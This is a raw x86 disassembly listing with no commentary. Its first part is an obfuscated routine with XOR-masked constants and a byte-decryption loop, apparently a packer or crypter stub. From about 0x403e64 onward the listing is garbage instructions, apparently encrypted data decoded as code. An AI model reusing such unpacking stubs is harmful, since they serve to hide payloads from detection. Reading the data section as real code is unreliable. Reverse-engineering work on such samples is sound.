  403a49:	cmp    DWORD PTR ds:0x428e9b,0xd
  403a50:	jb     0x403a8c
  403a56:	jmp    0x403a67
  403a5b:	push   DWORD PTR [ebp-0x18]
  403a5e:	push   DWORD PTR [ebp-0x1c]
  403a61:	call   DWORD PTR ds:0x42aa33
  403a67:	cmp    DWORD PTR ds:0x428e9b,0xc
  403a6e:	jne    0x403a7f
  403a74:	mov    eax,ds:0x428e9b
  403a79:	inc    eax
  403a7a:	mov    ds:0x428e9b,eax
  403a7f:	cmp    DWORD PTR ds:0x428e9b,0x15
  403a86:	jb     0x403a3e
  403a8c:	mov    dl,BYTE PTR [ebp-0x21]
  403a8f:	xor    eax,0x61a1
  403a94:	mov    eax,DWORD PTR [ebp-0x34]
  403a97:	xor    al,0xaf
  403a99:	mov    cl,0xa
  403a9b:	sub    cl,al
  403a9d:	add    DWORD PTR ds:0x428ea3,0x32c3
  403aa7:	add    dl,cl
  403aa9:	sbb    ecx,DWORD PTR ds:0x428eb3
  403aaf:	mov    ecx,DWORD PTR [ebp-0x1c]
  403ab2:	sub    DWORD PTR ds:0x428ea7,0x428e8f
  403abc:	xor    cl,0xaf
  403abf:	sub    cl,0xa
  403ac2:	sub    DWORD PTR ds:0x428ea3,0x68fd
  403acc:	ror    dl,cl
  403ace:	sub    DWORD PTR ds:0x428e6b,ebx
  403ad4:	xor    eax,eax
  403ad6:	mov    eax,DWORD PTR [ebp-0xc]
  403ad9:	add    DWORD PTR ds:0x428e8f,ebx
  403adf:	mov    BYTE PTR [eax+ebx*1+0x800],dl
  403ae6:	mov    ecx,DWORD PTR ds:0x4292cb
  403aec:	mov    eax,ds:0x429757
  403af1:	sub    ecx,eax
  403af3:	and    ecx,DWORD PTR [ecx+eax*1]
  403af6:	mov    eax,DWORD PTR [ebp-0xc]
  403af9:	mov    DWORD PTR ds:0x428e33,0x15
  403b03:	cmp    DWORD PTR ds:0x428e33,0x0
  403b0a:	je     0x403b3f
  403b10:	cmp    DWORD PTR ds:0x428e33,0x25
  403b17:	jbe    0x403b3f
  403b1d:	jmp    0x403b2d
  403b22:	push   0x428e23
  403b27:	call   DWORD PTR ds:0x42aa37
  403b2d:	mov    ecx,DWORD PTR ds:0x428e33
  403b33:	dec    ecx
  403b34:	mov    DWORD PTR ds:0x428e33,ecx
  403b3a:	jmp    0x403b03
  403b3f:	mov    ecx,DWORD PTR [ebp-0x28]
  403b42:	neg    DWORD PTR ds:0x428e5b
  403b48:	sub    eax,edi
  403b4a:	sub    DWORD PTR ds:0x428e8b,0x4b02
  403b54:	xor    eax,esi
  403b56:	mov    DWORD PTR ds:0x428ec7,0x6067
  403b60:	cmp    eax,ecx
  403b62:	jne    0x403b8c
  403b68:	mov    eax,DWORD PTR [ebp-0x8]
  403b6b:	mov    ecx,DWORD PTR [ebp-0x10]
  403b6e:	xor    eax,esi
  403b70:	xor    ecx,esi
  403b72:	sub    eax,ecx
  403b74:	sub    eax,edi
  403b76:	xor    eax,esi
  403b78:	mov    DWORD PTR [ebp-0x8],eax
  403b7b:	mov    eax,DWORD PTR [ebp-0x10]
  403b7e:	xor    eax,esi
  403b80:	mov    ecx,0xffcd8d8a
  403b85:	sub    ecx,eax
  403b87:	jmp    0x403b9b
  403b8c:	mov    eax,DWORD PTR [ebp-0x10]
  403b8f:	xor    eax,esi
  403b91:	mov    ecx,0xffcd8d0a
  403b96:	sub    ecx,eax
  403b98:	add    ecx,DWORD PTR [ebp-0xc]
  403b9b:	mov    DWORD PTR [ebp-0xc],ecx
  403b9e:	mov    eax,DWORD PTR [ebp-0x8]
  403ba1:	cmp    eax,0xf89c85a5
  403ba6:	jne    0x403815
  403bac:	mov    DWORD PTR [ebp-0x34],0x9
  403bb3:	mov    ecx,DWORD PTR [ebp+0x8]
  403bb6:	xor    ecx,esi
  403bb8:	add    ecx,edi
  403bba:	jmp    0x403e1a
  403bbf:	lea    eax,[ecx+ebx*1]
  403bc2:	mov    DWORD PTR [ebp-0x2c],eax
  403bc5:	mov    eax,DWORD PTR [ebp-0x58]
  403bc8:	sub    eax,ecx
  403bca:	mov    DWORD PTR [ebp-0x1c],eax
  403bcd:	mov    eax,DWORD PTR [ebp-0x1c]
  403bd0:	mov    DWORD PTR [ebp-0x14],eax
  403bd3:	mov    eax,DWORD PTR [ebp-0x2c]
  403bd6:	mov    DWORD PTR [ebp-0x38],0xf89c85a5
  403bdd:	mov    DWORD PTR [ebp-0x54],eax
  403be0:	mov    DWORD PTR [ebp-0x20],0xf89c85a4
  403be7:	mov    eax,DWORD PTR [ebp-0x38]
  403bea:	xor    eax,esi
  403bec:	add    eax,edi
  403bee:	mov    DWORD PTR [ebp-0x10],eax
  403bf1:	mov    eax,DWORD PTR [ebp-0x38]
  403bf4:	xor    eax,esi
  403bf6:	add    eax,edi
  403bf8:	mov    DWORD PTR [ebp-0x8],eax
  403bfb:	mov    DWORD PTR [ebp-0x2c],0xf89c8585
  403c02:	mov    DWORD PTR [ebp-0x44],0xf89c85be
  403c09:	mov    eax,DWORD PTR [ebp-0x38]
  403c0c:	mov    edx,DWORD PTR [ebp-0x14]
  403c0f:	xor    eax,esi
  403c11:	add    eax,edi
  403c13:	cmp    edx,eax
  403c15:	je     0x403e0e
  403c1b:	mov    eax,DWORD PTR [ebp-0x20]
  403c1e:	xor    eax,esi
  403c20:	mov    edx,0xffcd8d0a
  403c25:	sub    edx,eax
  403c27:	add    edx,DWORD PTR [ebp-0x14]
  403c2a:	mov    eax,DWORD PTR [ebp-0x20]
  403c2d:	mov    ebx,DWORD PTR [ebp-0x10]
  403c30:	xor    eax,esi
  403c32:	add    eax,edi
  403c34:	imul   eax,ebx
  403c37:	cmp    eax,edx
  403c39:	ja     0x403e0b
  403c3f:	mov    edx,DWORD PTR [ebp-0x10]
  403c42:	mov    eax,DWORD PTR [ebp-0x14]
  403c45:	mov    ebx,DWORD PTR [ebp-0x2c]
  403c48:	sub    eax,edx
  403c4a:	xor    ebx,esi
  403c4c:	xor    edx,edx
  403c4e:	add    ebx,edi
  403c50:	div    ebx
  403c52:	mov    DWORD PTR [ebp-0x8],eax
  403c55:	mov    eax,DWORD PTR [ebp-0x44]
  403c58:	mov    edx,DWORD PTR [ebp-0x8]
  403c5b:	xor    eax,esi
  403c5d:	add    eax,edi
  403c5f:	cmp    edx,eax
  403c61:	jbe    0x403c71
  403c67:	mov    eax,DWORD PTR [ebp-0x44]
  403c6a:	xor    eax,esi
  403c6c:	add    eax,edi
  403c6e:	mov    DWORD PTR [ebp-0x8],eax
  403c71:	mov    eax,DWORD PTR [ebp-0x2c]
  403c74:	mov    edx,DWORD PTR [ebp-0x8]
  403c77:	xor    eax,esi
  403c79:	add    eax,edi
  403c7b:	imul   eax,edx
  403c7e:	mov    DWORD PTR [ebp-0x8],eax
  403c81:	mov    eax,DWORD PTR [ebp-0x38]
  403c84:	mov    edx,DWORD PTR [ebp-0x8]
  403c87:	xor    eax,esi
  403c89:	add    eax,edi
  403c8b:	cmp    edx,eax
  403c8d:	je     0x403df4
  403c93:	mov    eax,DWORD PTR [ebp-0x8]
  403c96:	mov    DWORD PTR [ebp-0x18],eax
  403c99:	mov    eax,DWORD PTR [ebp-0x10]
  403c9c:	add    eax,DWORD PTR [ebp-0x54]
  403c9f:	mov    DWORD PTR [ebp-0x1c],0xf89c85a5
  403ca6:	mov    DWORD PTR [ebp-0x8],eax
  403ca9:	mov    eax,0xf89c85a4
  403cae:	mov    DWORD PTR [ebp-0x28],eax
  403cb1:	mov    DWORD PTR [ebp-0x5c],0xf89c85a3
  403cb8:	mov    DWORD PTR [ebp-0x40],0xf89c85a2
  403cbf:	mov    DWORD PTR [ebp-0x30],eax
  403cc2:	mov    eax,DWORD PTR [ebp-0x1c]
  403cc5:	xor    eax,esi
  403cc7:	add    eax,edi
  403cc9:	jmp    0x403db0
  403cce:	mov    DWORD PTR [ebp-0x4c],0xf89c85ba
  403cd5:	mov    DWORD PTR [ebp-0x50],0xf89c858f
  403cdc:	mov    eax,DWORD PTR [ebp-0x30]
  403cdf:	mov    edx,DWORD PTR [ebp-0xc]
  403ce2:	xor    eax,esi
  403ce4:	add    eax,edi
  403ce6:	imul   eax,edx
  403ce9:	mov    edx,DWORD PTR [ebp-0x8]
  403cec:	mov    al,BYTE PTR [eax+edx*1]
  403cef:	mov    BYTE PTR [ebp-0x1],al
  403cf2:	mov    eax,DWORD PTR [ebp-0x30]
  403cf5:	mov    edx,DWORD PTR [ebp-0xc]
  403cf8:	xor    eax,esi
  403cfa:	add    eax,edi
  403cfc:	imul   eax,edx
  403cff:	mov    edx,DWORD PTR [ebp-0x5c]
  403d02:	xor    edx,esi
  403d04:	add    eax,edx
  403d06:	mov    edx,DWORD PTR [ebp-0x8]
  403d09:	movzx  eax,BYTE PTR [eax+edx*1+0x3272f6]
  403d11:	mov    edx,DWORD PTR [ebp-0x4c]
  403d14:	xor    edx,esi
  403d16:	lea    eax,[edx+eax*1+0x3272f6]
  403d1d:	movzx  edx,BYTE PTR [ebp-0x1]
  403d21:	xor    edx,eax
  403d23:	mov    BYTE PTR [ebp-0x1],dl
  403d26:	mov    al,BYTE PTR [ebp-0x1]
  403d29:	mov    edx,DWORD PTR [ebp-0x30]
  403d2c:	mov    ebx,DWORD PTR [ebp-0xc]
  403d2f:	xor    edx,esi
  403d31:	add    edx,edi
  403d33:	imul   edx,ebx
  403d36:	mov    ebx,DWORD PTR [ebp-0x8]
  403d39:	mov    BYTE PTR [edx+ebx*1],al
  403d3c:	mov    eax,DWORD PTR [ebp-0x30]
  403d3f:	mov    edx,DWORD PTR [ebp-0xc]
  403d42:	xor    eax,esi
  403d44:	add    eax,edi
  403d46:	imul   eax,edx
  403d49:	mov    edx,DWORD PTR [ebp-0x8]
  403d4c:	mov    al,BYTE PTR [eax+edx*1]
  403d4f:	mov    BYTE PTR [ebp-0x1],al
  403d52:	mov    eax,DWORD PTR [ebp-0x30]
  403d55:	mov    edx,DWORD PTR [ebp-0xc]
  403d58:	xor    eax,esi
  403d5a:	add    eax,edi
  403d5c:	imul   eax,edx
  403d5f:	mov    edx,DWORD PTR [ebp-0x28]
  403d62:	xor    edx,esi
  403d64:	add    eax,edx
  403d66:	mov    edx,DWORD PTR [ebp-0x8]
  403d69:	movzx  eax,BYTE PTR [eax+edx*1+0x3272f6]
  403d71:	mov    edx,DWORD PTR [ebp-0x50]
  403d74:	xor    edx,esi
  403d76:	lea    eax,[edx+eax*1+0x3272f6]
  403d7d:	movzx  edx,BYTE PTR [ebp-0x1]
  403d81:	xor    edx,eax
  403d83:	mov    BYTE PTR [ebp-0x1],dl
  403d86:	mov    al,BYTE PTR [ebp-0x1]
  403d89:	mov    edx,DWORD PTR [ebp-0x30]
  403d8c:	mov    ebx,DWORD PTR [ebp-0xc]
  403d8f:	xor    edx,esi
  403d91:	add    edx,edi
  403d93:	imul   edx,ebx
  403d96:	mov    ebx,DWORD PTR [ebp-0x8]
  403d99:	mov    BYTE PTR [edx+ebx*1],al
  403d9c:	mov    eax,DWORD PTR [ebp-0x40]
  403d9f:	mov    edx,DWORD PTR [ebp-0x28]
  403da2:	xor    eax,esi
  403da4:	xor    edx,esi
  403da6:	add    eax,edi
  403da8:	add    edx,edi
  403daa:	imul   eax,edx
  403dad:	add    eax,DWORD PTR [ebp-0xc]
  403db0:	mov    DWORD PTR [ebp-0xc],eax
  403db3:	mov    eax,DWORD PTR [ebp-0xc]
  403db6:	mov    edx,DWORD PTR [ebp-0x18]
  403db9:	cmp    edx,eax
  403dbb:	jb     0x403cce
  403dc1:	mov    eax,DWORD PTR [ebp-0x28]
  403dc4:	mov    edx,DWORD PTR [ebp-0x18]
  403dc7:	xor    eax,esi
  403dc9:	add    eax,edi
  403dcb:	imul   eax,edx
  403dce:	mov    edx,DWORD PTR [ebp-0x1c]
  403dd1:	xor    edx,esi
  403dd3:	add    edx,edi
  403dd5:	or     eax,edx
  403dd7:	mov    edx,DWORD PTR [ebp-0x20]
  403dda:	xor    edx,esi
  403ddc:	add    eax,edx
  403dde:	mov    edx,DWORD PTR [ebp-0x20]
  403de1:	xor    edx,esi
  403de3:	add    eax,edx
  403de5:	mov    edx,DWORD PTR [ebp-0x10]
  403de8:	lea    eax,[eax+edx*1+0x64e5ec]
  403def:	jmp    0x403e03
  403df4:	mov    eax,DWORD PTR [ebp-0x20]
  403df7:	mov    edx,DWORD PTR [ebp-0x10]
  403dfa:	xor    eax,esi
  403dfc:	lea    eax,[eax+edx*1+0x3272f6]
  403e03:	mov    DWORD PTR [ebp-0x10],eax
  403e06:	jmp    0x403c1b
  403e0b:	mov    ebx,DWORD PTR [ebp-0x3c]
  403e0e:	mov    eax,DWORD PTR [ebp+0xc]
  403e11:	xor    eax,esi
  403e13:	lea    ecx,[ecx+eax*1+0x3272f6]
  403e1a:	lea    eax,[ecx-0x3272f6]
  403e20:	xor    eax,esi
  403e22:	cmp    eax,0xf89c95a5
  403e27:	jne    0x403bbf
  403e2d:	dec    DWORD PTR [ebp-0x34]
  403e30:	jne    0x403bb3
  403e36:	mov    eax,DWORD PTR [ebp+0x8]
  403e39:	mov    ecx,DWORD PTR [ebp+0xc]
  403e3c:	mov    edx,DWORD PTR [ebp+0x8]
  403e3f:	xor    ecx,esi
  403e41:	mov    cl,BYTE PTR [ecx+ebx*1+0x3272f6]
  403e48:	xor    eax,esi
  403e4a:	mov    al,BYTE PTR [eax+ebx*1+0x3272f6]
  403e51:	xor    edx,esi
  403e53:	mov    BYTE PTR [edx+ebx*1+0x3272f6],cl
  403e5a:	mov    ecx,DWORD PTR [ebp+0xc]
  403e5d:	xor    ecx,esi
  403e5f:	jmp    0x4061b8
  403e64:	outs   dx,BYTE PTR ds:[esi]
  403e65:	pop    edi
  403e66:	or     al,BYTE PTR [bp+0xa]
  403e6a:	push   cs
  403e6b:	pop    ss
  403e6c:	xor    edx,esi
  403e6e:	cld    
  403e6f:	fwait
  403e70:	xchg   ebp,eax
  403e71:	jb     0x403ed1
  403e73:	push   ss
  403e74:	inc    edi
  403e75:	pusha  
  403e76:	add    DWORD PTR [ebx-0x7c7c9fb9],0x56
  403e7d:	imul   edi,DWORD PTR [edi-0x12ea7547],0x4
  403e84:	cmp    eax,0x6f5a8349
  403e89:	mov    cl,0x5d
  403e8b:	test   BYTE PTR [eax-0x2d],0xc
  403e8f:	and    BYTE PTR [edx-0x67f62f60],bh
  403e95:	mov    ch,0xd
  403e97:	bound  edi,QWORD PTR [ebx+0x68082480]
  403e9d:	shr    ah,0x33
  403ea0:	enter  0x8ab4,0xe4
  403ea4:	pop    ss
  403ea5:	sub    eax,0xaa55ccb3
  403eaa:	cmp    edi,DWORD PTR [esi]
  403eac:	mov    edi,0xbbcad0b7
  403eb1:	js     0x403e92
  403eb3:	shl    DWORD PTR [ebx+ecx*8],cl
  403eb6:	sbb    al,0xa9
  403eb8:	or     DWORD PTR [ebx],esi
  403eba:	shl    DWORD PTR ds:0x80354bd7,cl
  403ec0:	mov    ds:0x184fca2b,al
  403ec5:	ror    DWORD PTR [edi+0x103c5f85],0x87
  403ecc:	pop    ds
  403ecd:	inc    esi
  403ece:	sbb    eax,0xe5be3c34
  403ed3:	and    eax,0x79fe7978
  403ed8:	sahf   
  403ed9:	push   ss
  403eda:	adc    BYTE PTR [eax+0x7d],bh
  403edd:	aam    0x10
  403edf:	jnp    0x403f03
  403ee1:	jb     0x403ec8
  403ee3:	fdivr  QWORD PTR [edx]
  403ee5:	mov    esp,0x69d1975e
  403eea:	or     ebx,DWORD PTR [esi]
  403eec:	mov    edi,0xa98ac5b0
  403ef1:	cs pop ss
  403ef3:	sub    BYTE PTR [esi+0x206d3d72],ah
  403ef9:	push   esp
  403efa:	sub    BYTE PTR [esi],0x1
  403efd:	aas    
  403efe:	cdq    
  403eff:	loopne 0x403f7b
  403f01:	or     DWORD PTR [ebx+0x21],ebp
  403f04:	adc    BYTE PTR [ecx],bl
  403f06:	out    dx,eax
  403f07:	mov    edx,0xc83baa4
  403f0c:	jmp    0x403f6d
  403f0e:	pop    ss
  403f0f:	pushw  0xffda
  403f12:	(bad)  
  403f13:	push   esp
  403f14:	inc    edi
  403f15:	push   edi
  403f16:	pop    ecx
  403f17:	ret    
  403f18:	jnp    0x403efd
  403f1a:	js     0x403eb8
  403f1c:	cdq    
  403f1d:	push   ecx
  403f1e:	mov    BYTE PTR [esi],0x5f
  403f21:	xchg   esp,eax
  403f22:	cs cmc 
  403f24:	xchg   ebp,eax
  403f25:	mov    eax,0x2a97c41f
  403f2a:	test   al,0x11
  403f2c:	xor    esp,DWORD PTR [edi]
  403f2e:	mov    edx,0x758981a7
  403f33:	xchg   esi,eax
  403f34:	adc    DWORD PTR [edi],ecx
  403f36:	int    0xf
  403f38:	loopne 0x403f46
  403f3a:	or     esp,0x76
  403f3d:	cld    
  403f3e:	xor    eax,0xa4424888
  403f43:	fsubr  DWORD PTR [ebx+0x40]
  403f46:	add    eax,DWORD PTR [ebx]
  403f48:	push   0xffffffb6
  403f4a:	pop    es
  403f4b:	jbe    0x403f47
  403f4d:	out    0xbc,eax
  403f4f:	test   DWORD PTR [eax],eax
  403f51:	cli    
  403f52:	sar    DWORD PTR ds:[eax-0x6829444a],0xb6
  403f5a:	adc    eax,0x35a43f
  403f5f:	gs call 0xb00f:0xe2e7498d
  403f67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403f68:	xchg   edx,eax
  403f69:	nop
  403f6a:	sbb    esp,DWORD PTR [edi]
  403f6c:	(bad)  
  403f6e:	inc    ebx
  403f6f:	push   cs
  403f70:	nop
  403f71:	fisub  WORD PTR [ebx+0xd]
  403f74:	jge    0x403f58
  403f76:	fdivr  st(6),st
  403f78:	inc    ecx
  403f79:	mov    edx,DWORD PTR [edi+0x295eb1a2]
  403f7f:	cmp    DWORD PTR [eax+0x47],edx
  403f82:	icebp  
  403f83:	jle    0x403f09
  403f85:	sbb    DWORD PTR [ecx],ebx
  403f87:	aas    
  403f88:	pop    esi
  403f89:	test   eax,0x3b886de8
  403f8e:	jmp    0x403fa5
  403f90:	xlat   BYTE PTR ds:[ebx]
  403f91:	loop   0x404007
  403f93:	jp     0x403f8c
  403f95:	jmp    0x7f94ca5
  403f9a:	cli    
  403f9b:	fistp  WORD PTR [edx]
  403f9d:	inc    edi
  403f9e:	xor    al,0x45
  403fa0:	ins    BYTE PTR es:[edi],dx
  403fa1:	xor    al,0xfe
  403fa3:	push   edx
  403fa4:	clc    
  403fa5:	mov    edi,ebx
  403fa7:	je     0x403f60
  403fa9:	retf   0x45bc
  403fac:	mov    esi,0xe367fd48
  403fb1:	xor    dl,BYTE PTR [esi-0x60]
  403fb4:	outs   dx,DWORD PTR ds:[esi]
  403fb5:	mov    eax,ds:0x77dad032
  403fba:	mov    eax,0x8206a625
  403fbf:	xchg   DWORD PTR [edi+0x4a2cfbbc],esi
  403fc5:	xor    eax,0x21274171
  403fca:	test   al,0xd0
  403fcc:	imul   edx,DWORD PTR [ecx+ecx*4-0x31005e30],0xfd6a2750
  403fd7:	adc    DWORD PTR [ebp+0x127a4360],edi
  403fdd:	sub    ch,BYTE PTR [esi-0x48]
  403fe0:	add    al,0x8d
  403fe2:	push   0x15bb7e36
  403fe7:	mov    esi,0x8ea2438a
  403fec:	out    dx,al
  403fed:	sbb    eax,0x4856a100
  403ff2:	lods   al,BYTE PTR ds:[esi]
  403ff3:	inc    ebx
  403ff4:	sub    esp,DWORD PTR [ebp-0x3c49da4a]
  403ffa:	subps  xmm6,XMMWORD PTR [edi+0x5809ba2b]
  404001:	into   
  404002:	adc    DWORD PTR [ecx+0x48],eax
  404005:	sub    eax,0x4ddef3c3
  40400a:	scas   eax,DWORD PTR es:[edi]
  40400b:	xor    BYTE PTR [eax+0x164e5dff],ch
  404011:	enter  0x52c6,0xd3
  404015:	cmp    eax,DWORD PTR [edi]
  404017:	and    ebp,edi
  404019:	arpl   WORD PTR [ebx-0x6bcfd6ef],sp
  40401f:	popa   
  404020:	in     al,0x67
  404022:	rcl    ah,1
  404024:	sti    
  404025:	pop    edi
  404026:	addr16 shl eax,0x4c
  40402a:	inc    eax
  40402b:	push   es
  40402c:	pop    edi
  40402d:	pop    ebx
  40402e:	mov    WORD PTR es:[edx+0x17897fa5],?
  404035:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404036:	pop    ds
  404037:	or     eax,0x51d7c668
  40403c:	push   0x50
  40403e:	fldenv [edx+0x556cee76]
  404044:	dec    ebx
  404045:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404046:	add    eax,0x220a3dd4
  40404b:	out    dx,al
  40404c:	dec    edi
  40404d:	mov    edi,0x829db754
  404052:	imul   esp,DWORD PTR [ecx-0x54bbb088],0x57a8b6f0
  40405c:	enter  0xc37a,0xf2
  404060:	cmp    al,0x31
  404062:	loope  0x404005
  404064:	sbb    eax,0x9fdd9119
  404069:	daa    
  40406a:	(bad)  
  40406b:	aaa    
  40406c:	sub    DWORD PTR [edi-0x4a],ebp
  40406f:	mov    dh,0x3b
  404072:	cmp    eax,0xf79bf650
  404077:	xchg   esp,eax
  404078:	jnp    0x4040c0
  40407a:	ss mov bl,0xbe
  40407d:	(bad)
  404081:	adc    edx,ecx
  404083:	cli    
  404084:	test   eax,0xbfb1d33c
  404089:	stos   DWORD PTR es:[edi],eax
  40408a:	imul   eax,DWORD PTR [edi-0x2414208e],0x27173fb5
  404094:	jl     0x4040ec
  404096:	inc    ebp
  404097:	dec    ebp
  404098:	mov    eax,0x254b6477
  40409d:	jns    0x4040ef
  40409f:	inc    edi
  4040a0:	sbb    edi,DWORD PTR [esi]
  4040a2:	xchg   ecx,eax
  4040a3:	sbb    al,0xc2
  4040a5:	and    DWORD PTR [ebx+eax*1+0x75da7b56],0xffffffd2
  4040ad:	outs   dx,BYTE PTR ds:[esi]
  4040ae:	xor    DWORD PTR [eax+0x35],0xffffffd5
  4040b2:	jl     0x40407f
  4040b4:	xchg   ebx,eax
  4040b5:	test   al,0xce
  4040b7:	test   DWORD PTR [eax+0x2d],esi
  4040ba:	mov    ds:0x69fac0a4,al
  4040bf:	jo     0x4040c2
  4040c1:	int3   
  4040c2:	lock idiv esi
  4040c5:	jae    0x404073
  4040c7:	mov    ebx,0x1329c98
  4040cc:	adc    dl,cl
  4040ce:	popf   
  4040cf:	mov    WORD PTR [esi+0x7a],gs
  4040d2:	mov    dl,BYTE PTR [esi-0x20a55099]
  4040d8:	push   es
  4040d9:	push   ecx
  4040da:	xchg   DWORD PTR [edi-0x3733b05a],esp
  4040e0:	sub    dl,dh
  4040e2:	rcl    BYTE PTR [edi+0x1a],0xac
  4040e6:	dec    ebp
  4040e7:	mov    ch,dl
  4040e9:	(bad)  
  4040ea:	mov    ebp,0xc2b67051
  4040ef:	and    al,0xf0
  4040f1:	call   0x8fc5:0xb59c7fb8
  4040f8:	cmp    DWORD PTR [eax+0x359f3d6d],edi
  4040fe:	jg     0x40417f
  404100:	add    al,0x99
  404102:	(bad)  
  404103:	ja     0x4040b7
  404105:	into   
  404106:	and    DWORD PTR [edx-0x25d528c3],eax
  40410c:	jbe    0x4040bc
  40410e:	xor    DWORD PTR [ebx],ebx
  404110:	ja     0x4040fb
  404112:	push   ss
  404113:	mov    al,BYTE PTR [ebx-0xb]
  404116:	push   es
  404117:	rol    DWORD PTR ds:0x2227872a,cl
  40411d:	and    esi,DWORD PTR [ecx+0x2a31cc0c]
  404123:	sub    al,0x42
  404125:	cmp    eax,0x53b6696c
  40412a:	or     dh,BYTE PTR [ecx]
  40412c:	jno    0x4041aa
  40412e:	test   BYTE PTR [edi],cl
  404130:	test   eax,0x82492544
  404135:	nop
  404136:	mov    ebx,0x402229fe
  40413b:	xchg   ebp,eax
  40413c:	push   esp
  40413d:	and    al,0xba
  40413f:	out    dx,eax
  404140:	out    0xc6,eax
  404142:	pop    es
  404143:	mov    ecx,0x5c73a3f1
  404148:	cmc    
  404149:	add    al,0x9b
  40414b:	mov    DWORD PTR [edi+0x57314c5d],esp
  404151:	xchg   ebp,eax
  404152:	pop    eax
  404153:	add    al,0xe9
  404155:	xchg   edx,eax
  404156:	mov    dh,0xbb
  404158:	jle    0x40416b
  40415a:	shr    BYTE PTR [esi-0x42f083ea],cl
  404160:	pop    edi
  404161:	les    ebp,FWORD PTR [edi+ecx*4+0x1e2ce554]
  404168:	sbb    al,0xe8
  40416a:	ins    BYTE PTR es:[edi],dx
  40416b:	inc    DWORD PTR [ebp+ebp*2+0x3d2e2b39]
  404172:	sahf   
  404173:	adc    DWORD PTR [ebx+0x674455ad],eax
  404179:	and    BYTE PTR [eax-0x229ae098],al
  40417f:	inc    ecx
  404180:	xchg   edx,eax
  404181:	out    0x75,al
  404183:	or     eax,0x6ee84be5
  404188:	jne    0x4041d4
  40418a:	jl     0x4041dd
  40418c:	inc    esp
  40418d:	loopne 0x4041c8
  40418f:	add    al,0x41
  404191:	mov    ds:0x3f470988,eax
  404196:	mov    ds:0xc81dbf1a,eax
  40419b:	fcmovbe st,st(6)
  40419d:	test   DWORD PTR [ebp+0x47],eax
  4041a0:	sub    al,bh
  4041a2:	cmp    dl,BYTE PTR [ecx+0x2a]
  4041a5:	int3   
  4041a6:	jecxz  0x4041fe
  4041a8:	fbld   TBYTE PTR [ebp-0x5a13593e]
  4041ae:	jge    0x4041d0
  4041b0:	stc    
  4041b1:	js     0x4041bd
  4041b3:	mov    ch,0x94
  4041b5:	jle    0x404139
  4041b7:	push   eax
  4041b8:	paddd  mm6,QWORD PTR [esi+0x65607209]
  4041bf:	push   eax
  4041c0:	loop   0x40416a
  4041c2:	std    
  4041c3:	jns    0x404159
  4041c5:	cdq    
  4041c6:	outs   dx,BYTE PTR ds:[esi]
  4041c7:	hlt    
  4041c8:	and    DWORD PTR [eax-0xf5f0f5c],esp
  4041ce:	cdq    
  4041cf:	sub    al,0x65
  4041d1:	mov    ebp,DWORD PTR [ebp-0x3fe0c098]
  4041d7:	push   es
  4041d8:	xor    dl,ah
  4041da:	mov    edx,0xfefd7189
  4041df:	js     0x404193
  4041e1:	adc    dl,BYTE PTR [edi+0x40bc6c5f]
  4041e7:	push   es
  4041e8:	out    0x81,al
  4041ea:	add    al,0xab
  4041ec:	adc    eax,0x926d18a1
  4041f1:	sub    BYTE PTR [edx],0x6a
  4041f4:	cdq    
  4041f5:	scas   eax,DWORD PTR es:[edi]
  4041f6:	loope  0x404239
  4041f8:	cdq    
  4041f9:	pop    ebp
  4041fa:	test   al,0x53
  4041fd:	rcl    DWORD PTR [edx+ecx*2-0x3c3b9c9a],cl
  404204:	mov    dl,cl
  404206:	inc    eax
  404207:	jbe    0x4041ba
  404209:	aad    0x4b
  40420b:	std    
  40420c:	push   ecx
  40420d:	ins    DWORD PTR es:[edi],dx
  40420e:	outs   dx,BYTE PTR ds:[esi]
  40420f:	pop    ss
  404210:	ror    BYTE PTR [esi],0x3d
  404213:	lods   eax,DWORD PTR ds:[esi]
  404214:	ins    DWORD PTR es:[edi],dx
  404215:	inc    esp
  404216:	xchg   edi,eax
  404217:	mov    ebp,0x30309394
  40421c:	or     edi,0x5b
  40421f:	lods   al,BYTE PTR ds:[esi]
  404220:	into   
  404221:	mov    cs,WORD PTR [eax+0x4682821d]
  404227:	cmc    
  404228:	test   al,0xff
  40422a:	jecxz  0x404279
  40422c:	jl     0x40429c
  40422e:	xchg   BYTE PTR [ebx+0x4],ah
  404231:	mov    edx,DWORD PTR [eax-0x12]
  404234:	xchg   ebp,eax
  404235:	and    BYTE PTR [eax],0xf5
  404238:	fisub  WORD PTR [ecx+0x3a8e8074]
  40423e:	mov    cl,0x5d
  404240:	(bad)  
  404241:	test   eax,0x6900f674
  404246:	cmp    eax,0xaa0d23b3
  40424b:	push   edi
  40424c:	not    DWORD PTR [esi-0x6d729882]
  404252:	dec    ebp
  404253:	(bad)  
  404254:	aam    0x99
  404256:	cli    
  404257:	in     al,dx
  404258:	aam    0xbb
  40425a:	mov    DWORD PTR [ebx],0x71d5c3f
  404260:	pusha  
  404261:	dec    ecx
  404262:	mov    ds:0x850a7065,al
  404267:	stos   BYTE PTR es:[edi],al
  404268:	jp     0x404211
  40426a:	adc    al,0x41
  40426c:	add    al,0x55
  40426e:	fistp  WORD PTR [ebx+0x78]
  404271:	rcr    DWORD PTR [esi-0x3af51845],1
  404277:	or     dl,dh
  404279:	fdivr  DWORD PTR ds:0xa6866da7
  40427f:	js     0x404214
  404281:	xchg   edi,eax
  404282:	imul   ebp,DWORD PTR ds:[eax],0xffffffa3
  404286:	(bad)  
  404287:	mov    cl,0x84
  404289:	jo     0x40428b
  40428b:	sub    ah,BYTE PTR [edx+0x23c76924]
  404291:	lahf   
  404292:	dec    edx
  404293:	xor    al,0xf6
  404295:	jbe    0x4042a4
  404297:	aad    0xb6
  404299:	repz dec ecx
  40429b:	stos   BYTE PTR es:[edi],al
  40429c:	je     0x4042d4
  40429e:	out    0x50,eax
  4042a0:	jo     0x404320
  4042a2:	retf   0xc07
  4042a5:	repnz sub eax,0x9500483d
  4042ab:	dec    esi
  4042ac:	call   0x1f47:0xdda162a
  4042b3:	inc    esi
  4042b4:	int    0xd7
  4042b6:	je     0x40427f
  4042b8:	mov    WORD PTR cs:0xfa05e1c5,cs
  4042bf:	into   
  4042c0:	aaa    
  4042c1:	or     edx,eax
  4042c3:	pusha  
  4042c4:	or     eax,0xd2a63b0e
  4042c9:	dec    esp
  4042ca:	das    
  4042cb:	mov    ebp,0x4430be6b
  4042d0:	jo     0x404336
  4042d2:	shr    DWORD PTR [ebp-0x50ad31d1],1
  4042d8:	jle    0x404343
  4042da:	retf   
  4042db:	out    dx,eax
  4042dc:	call   0xf685586f
  4042e1:	push   es
